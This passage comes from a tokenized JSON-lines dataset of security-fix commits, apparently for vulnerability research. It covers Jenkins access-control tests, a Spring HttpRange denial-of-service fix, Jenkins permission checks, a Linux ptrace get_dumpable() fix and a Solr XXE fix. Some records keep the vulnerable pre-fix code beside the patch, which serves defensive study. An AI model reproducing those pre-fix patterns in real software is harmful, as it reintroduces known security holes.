"Override", "public", "void", "run", "(", ")", "{", "assertThat", "(", "\"", "user2", "should", "be", "unable", "to", "see", "the", "origin", "\"", ",", "fp", ".", "getOriginal", "(", "),", "nullValue", "(", "))", ";", "assertEquals", "(", "\"", "Only", "one", "usage", "should", "be", "visible", "to", "user2", "\"", ",", "1", ",", "fp", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "assertEquals", "(", "\"", "Only", "project2", "should", "be", "visible", "to", "user2", "\"", ",", "project2", ".", "getFullName", "(", "),", "fp", ".", "_getUsages", "(", ").", "get", "(", "0", ")", ".", "name", ")", ";", "}", "}", ");", "ACL", ".", "impersonate", "(", "user3", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Fingerprint", ".", "BuildPtr", "original", "=", "fp", ".", "getOriginal", "(", ");", "assertThat", "(", "\"", "user3", "should", "be", "unable", "to", "see", "the", "origin", "\"", ",", "fp", ".", "getOriginal", "(", "),", "nullValue", "(", "))", ";", "assertEquals", "(", "\"", "All", "usages", "should", "be", "invisible", "for", "user3", "\"", ",", "0", ",", "fp", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Test", "public", "void", "shouldBeAbleToSeeOriginalWithDiscoverPermissionOnly", "(", ")", "throws", "Exception", "{", "/", "/", "Setup", "the", "environment", "final", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "\"", "project", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "final", "Fingerprint", "fingerprint", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "and", "security", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "setupProjectMatrixAuthStrategy", "(", "Jenkins", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Fingerprint", ".", "BuildPtr", "original", "=", "fingerprint", ".", "getOriginal", "(", ");", "assertThat", "(", "\"", "user1", "should", "able", "to", "see", "the", "origin", "\"", ",", "fingerprint", ".", "getOriginal", "(", "),", "notNullValue", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "name", "with", "Item", ".", "DISCOVER", "\"", ",", "project", ".", "getFullName", "(", "),", "original", ".", "getName", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "number", "with", "Item", ".", "DISCOVER", "\"", ",", "build", ".", "getNumber", "(", "),", "original", ".", "getNumber", "(", "))", ";", "assertEquals", "(", "\"", "Usage", "ref", "in", "fingerprint", "should", "be", "visible", "to", "user1", "\"", ",", "1", ",", "fingerprint", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Test", "public", "void", "shouldBeAbleToSeeFingerprintsInReadableFolder", "(", ")", "throws", "Exception", "{", "final", "SecuredMockFolder", "folder", "=", "rule", ".", "jenkins", ".", "createProject", "(", "SecuredMockFolder", ".", "class", ",", "\"", "folder", "\"", ");", "final", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "folder", ",", "\"", "project", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "final", "Fingerprint", "fingerprint", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "and", "security", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "setupProjectMatrixAuthStrategy", "(", "false", ",", "Jenkins", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "setJobPermissionsOnce", "(", "project", ",", "\"", "user1", "\"", ",", "Item", ".", "DISCOVER", ")", ";", "/", "/", "Prevents", "the", "fallback", "to", "the", "folder", "ACL", "folder", ".", "setPermissions", "(", "\"", "user1", "\"", ",", "Item", ".", "READ", ")", ";", "/", "/", "Ensure", "we", "can", "read", "the", "original", "from", "user", "account", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "assertTrue", "(", "\"", "Test", "framework", "issue", ":", "User1", "should", "be", "able", "to", "read", "the", "folder", "\"", ",", "folder", ".", "hasPermission", "(", "Item", ".", "READ", ")", ");", "Fingerprint", ".", "BuildPtr", "original", "=", "fingerprint", ".", "getOriginal", "(", ");", "assertThat", "(", "\"", "user1", "should", "able", "to", "see", "the", "origin", "\"", ",", "fingerprint", ".", "getOriginal", "(", "),", "notNullValue", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "name", "with", "Item", ".", "DISCOVER", "\"", ",", "project", ".", "getFullName", "(", "),", "original", ".", "getName", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "number", "with", "Item", ".", "DISCOVER", "\"", ",", "build", ".", "getNumber", "(", "),", "original", ".", "getNumber", "(", "))", ";", "assertEquals", "(", "\"", "user1", "should", "be", "able", "to", "see", "the", "job", "\"", ",", "1", ",", "fingerprint", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "assertThat", "(", "\"", "User", "should", "be", "unable", "do", "retrieve", "the", "job", "due", "to", "the", "missing", "read", "\"", ",", "original", ".", "getJob", "(", "),", "nullValue", "(", "))", ";", "}", "}", ");", "}", "@", "Test", "public", "void", "shouldBeUnableToSeeFingerprintsInUnreadableFolder", "(", ")", "throws", "Exception", "{", "final", "SecuredMockFolder", "folder", "=", "rule", ".", "jenkins", ".", "createProject", "(", "SecuredMockFolder", ".", "class", ",", "\"", "folder", "\"", ");", "final", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "folder", ",", "\"", "project", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "final", "Fingerprint", "fingerprint", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "and", "security", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "/", "/", "can", "access", "project1", "setupProjectMatrixAuthStrategy", "(", "Jenkins", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "/", "/", "Ensure", "we", "can", "read", "the", "original", "from", "user", "account", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "assertFalse", "(", "\"", "Test", "framework", "issue", ":", "User1", "should", "be", "unable", "to", "read", "the", "folder", "\"", ",", "folder", ".", "hasPermission", "(", "Item", ".", "READ", ")", ");", "assertThat", "(", "\"", "user1", "should", "be", "unable", "to", "see", "the", "origin", "\"", ",", "fingerprint", ".", "getOriginal", "(", "),", "nullValue", "(", "))", ";", "assertEquals", "(", "\"", "No", "jobs", "should", "be", "visible", "to", "user1", "\"", ",", "0", ",", "fingerprint", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "/", "**", "*", "A", "common", "non", "-", "admin", "user", "should", "not", "be", "able", "to", "see", "references", "to", "a", "*", "deleted", "job", "even", "if", "he", "used", "to", "have", "READ", "permissions", "before", "the", "deletion", ".", "*", "@", "throws", "Exception", "Test", "error", "*", "/", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "153", "\"", ")", "public", "void", "commonUserShouldBeUnableToSeeReferencesOfDeletedJobs", "(", ")", "throws", "Exception", "{", "/", "/", "Setup", "the", "environment", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "\"", "project", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "final", "Fingerprint", "fp", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "and", "security", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "setupProjectMatrixAuthStrategy", "(", "Jenkins", ".", "READ", ",", "Item", ".", "READ", ",", "Item", ".", "DISCOVER", ")", ";", "project", ".", "delete", "(", ");", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "assertThat", "(", "\"", "user1", "should", "be", "unable", "to", "see", "the", "origin", "\"", ",", "fp", ".", "getOriginal", "(", "),", "nullValue", "(", "))", ";", "assertEquals", "(", "\"", "No", "jobs", "should", "be", "visible", "to", "user1", "\"", ",", "0", ",", "fp", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Test", "public", "void", "adminShouldBeAbleToSeeReferencesOfDeletedJobs", "(", ")", "throws", "Exception", "{", "/", "/", "Setup", "the", "environment", "final", "FreeStyleProject", "project", "=", "createAndRunProjectWithPublisher", "(", "\"", "project", "\"", ",", "\"", "test", ".", "txt", "\"", ");", "final", "FreeStyleBuild", "build", "=", "project", ".", "getLastBuild", "(", ");", "final", "Fingerprint", "fingerprint", "=", "getFingerprint", "(", "build", ",", "\"", "test", ".", "txt", "\"", ");", "/", "/", "Init", "Users", "and", "security", "User", "user1", "=", "User", ".", "get", "(", "\"", "user1", "\"", ");", "setupProjectMatrixAuthStrategy", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "project", ".", "delete", "(", ");", "ACL", ".", "impersonate", "(", "user1", ".", "impersonate", "(", "),", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "Fingerprint", ".", "BuildPtr", "original", "=", "fingerprint", ".", "getOriginal", "(", ");", "assertThat", "(", "\"", "user1", "should", "able", "to", "see", "the", "origin", "\"", ",", "fingerprint", ".", "getOriginal", "(", "),", "notNullValue", "(", "))", ";", "assertThat", "(", "\"", "Job", "has", "been", "deleted", ",", "so", "Job", "reference", "shoud", "return", "null", "\"", ",", "fingerprint", ".", "getOriginal", "(", ").", "getJob", "(", "),", "nullValue", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "name", "with", "Item", ".", "DISCOVER", "\"", ",", "project", ".", "getFullName", "(", "),", "original", ".", "getName", "(", "))", ";", "assertEquals", "(", "\"", "user1", "sees", "the", "wrong", "original", "number", "with", "Item", ".", "DISCOVER", "\"", ",", "build", ".", "getNumber", "(", "),", "original", ".", "getNumber", "(", "))", ";", "assertEquals", "(", "\"", "user1", "should", "be", "able", "to", "see", "the", "job", "in", "usages", "\"", ",", "1", ",", "fingerprint", ".", "_getUsages", "(", ").", "size", "(", "))", ";", "}", "}", ");", "}", "@", "Nonnull", "private", "Fingerprint", "getFingerprint", "(", "@", "CheckForNull", "Run", "<", "?,", "?", ">", "run", ",", "@", "Nonnull", "String", "filename", ")", "{", "assertNotNull", "(", "\"", "Input", "run", "is", "null", "\"", ",", "run", ")", ";", "Fingerprinter", ".", "FingerprintAction", "action", "=", "run", ".", "getAction", "(", "Fingerprinter", ".", "FingerprintAction", ".", "class", ")", ";", "assertNotNull", "(", "\"", "Fingerprint", "action", "has", "not", "been", "created", "in", "\"", "+", "run", ",", "action", ")", ";", "Map", "<", "String", ",", "Fingerprint", ">", "fingerprints", "=", "action", ".", "getFingerprints", "(", ");", "final", "Fingerprint", "fp", "=", "fingerprints", ".", "get", "(", "filename", ")", ";", "assertNotNull", "(", "\"", "No", "reference", "to", "'", "\"", "+", "filename", "+", "\"", "'", "from", "the", "Fingerprint", "action", "\"", ",", "fp", ")", ";", "return", "fp", ";", "}", "@", "Nonnull", "private", "FreeStyleProject", "createAndRunProjectWithPublisher", "(", "String", "projectName", ",", "String", "fpFileName", ")", "throws", "Exception", "{", "return", "createAndRunProjectWithPublisher", "(", "null", ",", "projectName", ",", "fpFileName", ")", ";", "}", "@", "Nonnull", "private", "FreeStyleProject", "createAndRunProjectWithPublisher", "(", "@", "CheckForNull", "MockFolder", "folder", ",", "String", "projectName", ",", "String", "fpFileName", ")", "throws", "Exception", "{", "final", "FreeStyleProject", "project", ";", "if", "(", "folder", "=", "=", "null", ")", "{", "project", "=", "rule", ".", "createFreeStyleProject", "(", "projectName", ")", ";", "}", "else", "{", "project", "=", "folder", ".", "createProject", "(", "FreeStyleProject", ".", "class", ",", "projectName", ")", ";", "}", "project", ".", "getBuildersList", "(", ").", "add", "(", "new", "CreateFileBuilder", "(", "fpFileName", ",", "\"", "Hello", ",", "world", "!", "\")", ");", "ArtifactArchiver", "archiver", "=", "new", "ArtifactArchiver", "(", "fpFileName", ")", ";", "archiver", ".", "setFingerprint", "(", "true", ")", ";", "project", ".", "getPublishersList", "(", ").", "add", "(", "archiver", ")", ";", "rule", ".", "buildAndAssertSuccess", "(", "project", ")", ";", "return", "project", ";", "}", "private", "void", "setupProjectMatrixAuthStrategy", "(", "@", "Nonnull", "Permission", ".", "..", "permissions", ")", "{", "setupProjectMatrixAuthStrategy", "(", "true", ",", "permissions", ")", ";", "}", "private", "void", "setupProjectMatrixAuthStrategy", "(", "boolean", "inheritFromFolders", ",", "@", "Nonnull", "Permission", ".", "..", "permissions", ")", "{", "ProjectMatrixAuthorizationStrategy", "str", "=", "inheritFromFolders", "?", "new", "ProjectMatrixAuthorizationStrategy", "(", ")", ":", "new", "NoInheritanceProjectMatrixAuthorizationStrategy", "(", ");", "for", "(", "Permission", "p", ":", "permissions", ")", "{", "str", ".", "add", "(", "p", ",", "\"", "anonymous", "\"", ");", "}", "rule", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "str", ")", ";", "}", "/", "/", "TODO", ":", "could", "be", "reworked", "to", "support", "multiple", "assignments", "private", "void", "setJobPermissionsOnce", "(", "Job", "<", "?,", "?>", "job", ",", "String", "username", ",", "@", "Nonnull", "Permission", ".", "..", "s", ")", "throws", "IOException", "{", "assertThat", "(", "\"", "Cannot", "assign", "the", "property", "twice", "\"", ",", "job", ".", "getProperty", "(", "AuthorizationMatrixProperty", ".", "class", ")", ",", "nullValue", "(", "))", ";", "Map", "<", "Permission", ",", "Set", "<", "String", ">", ">", "permissions", "=", "new", "HashMap", "<", "Permission", ",", "Set", "<", "String", ">", ">(", ");", "HashSet", "<", "String", ">", "userSpec", "=", "new", "HashSet", "<", "String", ">", "(", "Arrays", ".", "asList", "(", "username", ")", ");", "for", "(", "Permission", "p", ":", "s", ")", "{", "permissions", ".", "put", "(", "p", ",", "userSpec", ")", ";", "}", "AuthorizationMatrixProperty", "property", "=", "new", "AuthorizationMatrixProperty", "(", "permissions", ")", ";", "job", ".", "addProperty", "(", "property", ")", ";", "}", "/", "**", "*", "Security", "strategy", ",", "which", "prevents", "the", "permission", "inheritance", "from", "upper", "folders", ".", "*", "/", "private", "static", "class", "NoInheritanceProjectMatrixAuthorizationStrategy", "extends", "ProjectMatrixAuthorizationStrategy", "{", "@", "Override", "public", "ACL", "getACL", "(", "Job", "<", "?,", "?", ">", "project", ")", "{", "AuthorizationMatrixProperty", "amp", "=", "project", ".", "getProperty", "(", "AuthorizationMatrixProperty", ".", "class", ")", ";", "if", "(", "amp", "!", "=", "null", ")", "{", "return", "amp", ".", "getACL", "(", ").", "newInheritingACL", "(", "getRootACL", "(", "))", ";", "}", "else", "{", "return", "getRootACL", "(", ");", "}", "}", "}", "}</s>*", "<", "p", ">", "*", "Such", "job", "could", "be", "since", "then", "removed", ",", "*", "so", "there", "might", "not", "be", "a", "corresponding", "*", "{", "@", "link", "Job", "}", ".", "*", "Such", "{", "@", "link", "Run", "}", "could", "be", "since", "then", "*", "discarded", ".", "*", "if", "the", "file", "is", "apparently", "created", "outside", "Hudson", ".", "return", "original", ";", "for", "(", "Entry", "<", "String", ",", "RangeSet", ">", "e", ":", "usages", ".", "entrySet", "(", "))", "r", ".", "add", "(", "new", "RangeItem", "(", "e", ".", "getKey", "(", "),", "e", ".", "getValue", "(", "))", ");", "<", "j", ":", "set", "var", "=", "\"", "range", "\"", "value", "=", "\"$", "{", "it", ".", "usages", "[", "j", "]", "}\"", "/", ">", "<", "tr", ">", "<", "td", "class", "=", "\"", "fingerprint", "-", "summary", "-", "header", "\"", ">", "<", "j", ":", "choose", ">", "<", "j", ":", "when", "test", "=", "\"$", "{", "job", "!", "=", "null", "}", "\">", "<", "a", "href", "=", "\"$", "{", "rootURL", "}", "/$", "{", "job", ".", "url", "}", "\"", "class", "=", "\"", "model", "-", "link", "inside", "\"", ">$", "{", "j", "}", "</", "a", ">", "<", "/", "j", ":", "when", ">", "<", "j", ":", "otherwise", ">", "$", "{", "j", "}", "<", "/", "j", ":", "otherwise", ">", "<", "/", "j", ":", "choose", ">", "<", "/", "td", ">", "<", "td", ">", "<", "t", ":", "buildRangeLink", "job", "=", "\"$", "{", "job", "}", "\"", "range", "=", "\"$", "{", "range", "}", "\"", "/", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "private", "MockFolder", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{"], "docstring_tokens": ["view", "the", "names", "of", "jobs", "and", "builds", "on", "the", "Fingerprints", "pages"]}
{"contents": ["HttpRange", "validates", "requested", "ranges", "Issue:", "SPR-17318"], "code_tokens": ["*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "/", "**", "Maximum", "ranges", "per", "request", ".", "*", "/", "private", "static", "final", "int", "MAX_RANGES", "=", "100", ";", "long", "contentLength", "=", "getLengthFor", "(", "resource", ")", ";", "long", "start", "=", "getRangeStart", "(", "contentLength", ")", ";", "long", "end", "=", "getRangeEnd", "(", "contentLength", ")", ";", "return", "new", "ResourceRegion", "(", "resource", ",", "start", ",", "end", "-", "start", "+", "1", ")", ";", "}", "private", "static", "long", "getLengthFor", "(", "Resource", "resource", ")", "{", "long", "contentLength", ";", "contentLength", "=", "resource", ".", "contentLength", "(", ");", "throw", "new", "IllegalArgumentException", "(", "\"", "Failed", "to", "obtain", "Resource", "content", "length", "\"", ",", "ex", ")", ";", "return", "contentLength", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "string", "cannot", "be", "parsed", ",", "or", "if", "*", "the", "number", "of", "ranges", "is", "greater", "than", "100", ".", "Assert", ".", "isTrue", "(", "tokens", ".", "length", "<", "=", "MAX_RANGES", ",", "(", ")", "-", ">", "\"", "Too", "many", "ranges", "\"", "+", "tokens", ".", "length", ")", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "sum", "of", "all", "ranges", "exceeds", "the", "*", "resource", "length", ".", "if", "(", "ranges", ".", "size", "(", ")", ">", "1", ")", "{", "long", "length", "=", "getLengthFor", "(", "resource", ")", ";", "long", "total", "=", "regions", ".", "stream", "(", ").", "map", "(", "ResourceRegion", ":", ":", "getCount", ")", ".", "reduce", "(", "0L", ",", "(", "count", ",", "sum", ")", "-", ">", "sum", "+", "count", ")", ";", "Assert", ".", "isTrue", "(", "total", "<", "length", ",", "(", ")", "-", ">", "\"", "The", "sum", "of", "all", "ranges", "(", "\"", "+", "total", "+", "\"", ")", "\"", "\"", "should", "be", "less", "than", "the", "resource", "length", "(", "\"", "+", "length", "+", "\"", ")\"", ");", "}", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "stream", ".", "Stream", ";", "@", "Test", "public", "void", "parseRangesValidations", "(", ")", "{", "/", "/", "1", ".", "At", "limit", ".", ".", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", "\"", "bytes", "=", "0", "-", "0", "\"", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "99", ";", "i", "+", "+)", "{", "sb", ".", "append", "(", "\",", "\")", ".", "append", "(", "i", ")", ".", "append", "(", "\"-", "\")", ".", "append", "(", "i", "+", "1", ")", ";", "}", "List", "<", "HttpRange", ">", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "sb", ".", "toString", "(", "))", ";", "assertEquals", "(", "100", ",", "ranges", ".", "size", "(", "))", ";", "/", "/", "2", ".", "Above", "limit", ".", ".", "sb", "=", "new", "StringBuilder", "(", "\"", "bytes", "=", "0", "-", "0", "\"", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "100", ";", "i", "+", "+)", "{", "sb", ".", "append", "(", "\",", "\")", ".", "append", "(", "i", ")", ".", "append", "(", "\"-", "\")", ".", "append", "(", "i", "+", "1", ")", ";", "}", "try", "{", "HttpRange", ".", "parseRanges", "(", "sb", ".", "toString", "(", "))", ";", "fail", "(", ");", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Expected", "}", "}", "@", "Test", "public", "void", "toResourceRegionsValidations", "(", ")", "{", "byte", "[", "]", "bytes", "=", "\"", "12345", "\"", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ";", "ByteArrayResource", "resource", "=", "new", "ByteArrayResource", "(", "bytes", ")", ";", "/", "/", "1", ".", "Below", "length", "List", "<", "HttpRange", ">", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "\"", "bytes", "=", "0", "-", "1", ",", "2", "-", "3", "\"", ");", "List", "<", "ResourceRegion", ">", "regions", "=", "HttpRange", ".", "toResourceRegions", "(", "ranges", ",", "resource", ")", ";", "assertEquals", "(", "2", ",", "regions", ".", "size", "(", "))", ";", "/", "/", "2", ".", "At", "length", "ranges", "=", "HttpRange", ".", "parseRanges", "(", "\"", "bytes", "=", "0", "-", "1", ",", "2", "-", "4", "\"", ");", "try", "{", "HttpRange", ".", "toResourceRegions", "(", "ranges", ",", "resource", ")", ";", "fail", "(", ");", "}", "catch", "(", "IllegalArgumentException", "ex", ")", "{", "/", "/", "Expected", ".", ".", "}", "}</s>*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", ".", "long", "contentLength", "=", "resource", ".", "contentLength", "(", ");", "long", "start", "=", "getRangeStart", "(", "contentLength", ")", ";", "long", "end", "=", "getRangeEnd", "(", "contentLength", ")", ";", "return", "new", "ResourceRegion", "(", "resource", ",", "start", ",", "end", "-", "start", "+", "1", ")", ";", "throw", "new", "IllegalArgumentException", "(", "\"", "Failed", "to", "convert", "Resource", "to", "ResourceRegion", "\"", ",", "ex", ")", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "string", "cannot", "be", "parsed", "*", "Copyright", "2002", "-", "2017", "the", "original", "author", "or", "authors", "."], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["add", "@POST", "and", "admin", "permission", "check", "to", "methods"], "code_tokens": ["import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "POST", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "POST", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "POST", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "verb", ".", "POST", ";", "@", "POST", "Jenkins", ".", "get", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";</s>"], "docstring_tokens": ["users", "with", "View/Configure", "permission", "to", "add", "a", "new", "column", "to", "list", "views", "that", "contains", "a", "user-configurable", "link"]}
{"contents": ["exec/ptrace:", "fix", "get_dumpable()", "incorrect", "tests", "The", "get_dumpable()", "return", "value", "is", "not", "boolean.", "Most", "users", "of", "the", "function", "actually", "want", "to", "be", "testing", "for", "non-SUID_DUMP_USER(1)", "rather", "than", "SUID_DUMP_DISABLE(0).", "The", "SUID_DUMP_ROOT(2)", "is", "also", "considered", "a", "protected", "state.", "Almost", "all", "places", "did", "this", "correctly,", "excepting", "the", "two", "places", "fixed", "in", "this", "patch.", "Wrong", "logic:", "if", "(dumpable", "==", "SUID_DUMP_DISABLE)", "{", "/*", "be", "protective", "*/", "}", "or", "if", "(dumpable", "==", "0)", "{", "/*", "be", "protective", "*/", "}", "or", "if", "(!dumpable)", "{", "/*", "be", "protective", "*/", "}", "Correct", "logic:", "if", "(dumpable", "!=", "SUID_DUMP_USER)", "{", "/*", "be", "protective", "*/", "}", "or", "if", "(dumpable", "!=", "1)", "{", "/*", "be", "protective", "*/", "}", "Without", "this", "patch,", "if", "the", "system", "had", "set", "the", "sysctl", "fs/suid_dumpable=2,", "a", "user", "was", "able", "to", "ptrace", "attach", "to", "processes", "that", "had", "dropped", "privileges", "to", "that", "user.", "(This", "may", "have", "been", "partially", "mitigated", "if", "Yama", "was", "enabled.)", "The", "macros", "have", "been", "moved", "into", "the", "file", "that", "declares", "get/set_dumpable(),", "which", "means", "things", "like", "the", "ia64", "code", "can", "see", "them", "too.", "Reported-by:", "Vasily", "Kulikov", "<segoon@openwall.com>", "Signed-off-by:", "Kees", "Cook", "<keescook@chromium.org>", "Cc:", "\"Luck,", "Tony\"", "<tony.luck@intel.com>", "Cc:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "\"Eric", "W.", "Biederman\"", "<ebiederm@xmission.com>", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "unlikely", "(", "get_dumpable", "(", "current", "-", ">", "mm", ")", "!", "=", "SUID_DUMP_USER", ")", ")", "{", "\\", "/", "*", "*", "This", "returns", "the", "actual", "value", "of", "the", "suid_dumpable", "flag", ".", "For", "things", "*", "that", "are", "using", "this", "for", "checking", "for", "privilege", "transitions", ",", "it", "must", "*", "test", "against", "SUID_DUMP_USER", "rather", "than", "treating", "it", "as", "a", "boolean", "*", "value", ".", "*", "/", "#", "define", "SUID_DUMP_DISABLE", "0", "/", "*", "No", "setuid", "dumping", "*", "/", "#", "define", "SUID_DUMP_USER", "1", "/", "*", "Dump", "as", "user", "of", "process", "*", "/", "#", "define", "SUID_DUMP_ROOT", "2", "/", "*", "Dump", "as", "root", "*", "/", "if", "(", "dumpable", "!", "=", "SUID_DUMP_USER", "&", "&", "!", "ptrace_has_cap", "(", "__task_cred", "(", "task", ")", "->", "user_ns", ",", "mode", ")", ")", "{</s>if", "(", "unlikely", "(", "!", "get_dumpable", "(", "current", "-", ">", "mm", ")", "))", "{", "\\", "#", "define", "SUID_DUMP_DISABLE", "0", "/", "*", "No", "setuid", "dumping", "*", "/", "#", "define", "SUID_DUMP_USER", "1", "/", "*", "Dump", "as", "user", "of", "process", "*", "/", "#", "define", "SUID_DUMP_ROOT", "2", "/", "*", "Dump", "as", "root", "*", "/", "if", "(", "!", "dumpable", "&", "&", "!", "ptrace_has_cap", "(", "__task_cred", "(", "task", ")", "->", "user_ns", ",", "mode", ")", ")", "{"], "docstring_tokens": ["gain", "ptrace", "attach", "access", "to", "otherwise", "restricted", "processes"]}
{"contents": ["SOLR-11477:", "Disallow", "resolving", "of", "external", "entities", "in", "Lucene", "queryparser/xml/CoreParser", "and", "SolrCoreParser", "(defType=xmlparser", "or", "{!xmlparser", "...})", "by", "default.", "(Michael", "Stepankin,", "Olga", "Barinova,", "Uwe", "Schindler,", "Christine", "Poerschke)"], "code_tokens": ["Changes", "in", "Runtime", "Behavior", "*", "Resolving", "of", "external", "entities", "in", "queryparser", "/", "xml", "/", "CoreParser", "is", "disallowed", "by", "default", ".", "See", "SOLR", "-", "11477", "for", "details", ".", "Bug", "Fixes", "*", "SOLR", "-", "11477", ":", "Disallow", "resolving", "of", "external", "entities", "in", "queryparser", "/", "xml", "/", "CoreParser", "by", "default", ".", "(", "Michael", "Stepankin", ",", "Olga", "Barinova", ",", "Uwe", "Schindler", ",", "Christine", "Poerschke", ")", "import", "org", ".", "xml", ".", "sax", ".", "EntityResolver", ";", "import", "org", ".", "xml", ".", "sax", ".", "ErrorHandler", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "java", ".", "util", ".", "Locale", ";", "/", "**", "*", "Parses", "the", "given", "stream", "as", "XML", "file", "and", "returns", "a", "{", "@", "link", "Query", "}", ".", "*", "By", "default", "this", "disallows", "external", "entities", "for", "security", "reasons", ".", "*", "/", "/", "**", "*", "Returns", "a", "SAX", "{", "@", "link", "EntityResolver", "}", "to", "be", "used", "by", "{", "@", "link", "DocumentBuilder", "}", ".", "*", "By", "default", "this", "returns", "{", "@", "link", "#", "DISALLOW_EXTERNAL_ENTITY_RESOLVER", "}", ",", "which", "disallows", "the", "*", "expansion", "of", "external", "entities", "(", "for", "security", "reasons", ")", ".", "To", "restore", "legacy", "behavior", ",", "*", "override", "this", "method", "to", "return", "{", "@", "code", "null", "}", ".", "*", "/", "protected", "EntityResolver", "getEntityResolver", "(", ")", "{", "return", "DISALLOW_EXTERNAL_ENTITY_RESOLVER", ";", "}", "/", "**", "*", "Subclass", "and", "override", "to", "return", "a", "SAX", "{", "@", "link", "ErrorHandler", "}", "to", "be", "used", "by", "{", "@", "link", "DocumentBuilder", "}", ".", "*", "By", "default", "this", "returns", "{", "@", "code", "null", "}", "so", "no", "error", "handler", "is", "used", ".", "*", "This", "method", "can", "be", "used", "to", "redirect", "XML", "parse", "errors", "/", 